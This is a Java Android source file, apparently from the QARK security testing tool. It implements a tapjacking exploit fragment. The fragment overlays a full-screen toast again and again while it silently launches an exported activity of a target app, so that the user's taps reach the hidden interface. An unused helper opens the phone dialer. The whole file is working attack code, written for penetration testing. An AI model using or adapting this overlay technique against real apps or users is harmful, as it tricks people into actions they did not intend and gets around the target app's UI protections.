/*
 * Copyright 2015 LinkedIn Corp. Licensed under the Apache License, Version 2.0 (the "License");
 * You may not use this file except in compliance with the License.
 * You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 */

 package com.secbro.qark.tapjacking;

 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
 import android.widget.AdapterView;
 import android.widget.ArrayAdapter;
 import android.widget.ListAdapter;
 import android.widget.ListView;
 import android.widget.Toast;
 
 import androidx.annotation.Nullable;
 import androidx.fragment.app.ListFragment; // Migrated to AndroidX
 
 import com.secbro.qark.R;
 import com.secbro.qark.TopLevelActivity;
 
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
 public class TapJackingExploitFragment extends ListFragment {
 
     private static final String LOG_TAG = TapJackingExploitFragment.class.getSimpleName();
 
     private ListView mListView;
     private ListAdapter mAdapter;
     private List<String> exportedActivities;
     private Map<String, String> exportedActivitiesNamesMap;
     private String exportedActivityName;
 
     public static TapJackingExploitFragment newInstance() {
         return new TapJackingExploitFragment();
     }
 
     public TapJackingExploitFragment() {
         // Required empty public constructor
     }
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
         exportedActivities = Arrays.asList(getResources().getStringArray(R.array.exportedActivities));
 
         if (exportedActivities != null && !exportedActivities.isEmpty()) {
             exportedActivitiesNamesMap = new HashMap<>();
             for (String intent : exportedActivities) {
                 int resId = getResources().getIdentifier(intent, "string", requireActivity().getPackageName());
                 if (resId != 0) {
                     exportedActivitiesNamesMap.put(intent, getResources().getString(resId));
                 } else {
                     Log.e(LOG_TAG, "No matching exportedActivities names found in string.xml for " + intent);
                 }
             }
 
             mAdapter = new ArrayAdapter<>(requireActivity(),
                     android.R.layout.simple_list_item_1, android.R.id.text1, new ArrayList<>(exportedActivitiesNamesMap.values()));
         } else {
             Log.d(LOG_TAG, "No exported activities to exploit");
         }
     }
 
     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
         View retVal = inflater.inflate(R.layout.fragment_tap_jacking_exploit, container, false);
         mListView = retVal.findViewById(android.R.id.list);
         if (mListView != null) {
             mListView.setAdapter(mAdapter);
         }
         return retVal;
     }
 
     @Override
     public void onListItemClick(ListView l, View v, int position, long id) {
         super.onListItemClick(l, v, position, id);
 
         fireLongToast(createToast());
 
         int resId = getResources().getIdentifier(exportedActivities.get(position), "string", requireActivity().getPackageName());
         if (resId != 0) {
             exportedActivityName = getResources().getString(resId);
             launchExportedActivity(exportedActivityName);
         } else {
             Log.e(LOG_TAG, "Failed to retrieve exported activity name for position: " + position);
         }
     }
 
     private Toast createToast() {
         LayoutInflater inflater = LayoutInflater.from(requireActivity());
         Toast toast = Toast.makeText(requireActivity(), "", Toast.LENGTH_SHORT);
         View view = inflater.inflate(R.layout.tap_jacking_toast, null);
         toast.setView(view);
         toast.setGravity(Gravity.FILL, 0, 0);
         return toast;
     }
 
     private void fireLongToast(final Toast toast) {
         new Thread(() -> {
             int maxCount = 10;
             for (int count = 0; count < maxCount; count++) {
                 try {
                     toast.show();
                     if (count == maxCount - 1) {
                         Intent intent = new Intent(requireActivity(), TopLevelActivity.class);
                         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                         startActivity(intent);
                     }
                     Thread.sleep(1650);
                 } catch (Exception e) {
                     Log.e(LOG_TAG, "Error displaying toast", e);
                 }
             }
         }).start();
     }
 
     private void launchExportedActivity(final String exportedActivityName) {
         new Thread(() -> {
             try {
                 Thread.sleep(1800);
                 Intent intent = new Intent();
                 intent.setComponent(new ComponentName(getString(R.string.packageName), exportedActivityName));
                 intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
             } catch (Exception e) {
                 Log.e(LOG_TAG, "Failed to launch exported activity", e);
             }
         }).start();
     }
 
     private void launchDialer() {
         new Thread(() -> {
             try {
                 Thread.sleep(2000);
                 Intent intent = new Intent(Intent.ACTION_DIAL);
                 intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 intent.setData(Uri.parse("tel:650-253-0000"));
                 startActivity(intent);
             } catch (Exception e) {
                 Log.e(LOG_TAG, "Failed to launch dialer", e);
             }
         }).start();
     }
 }
 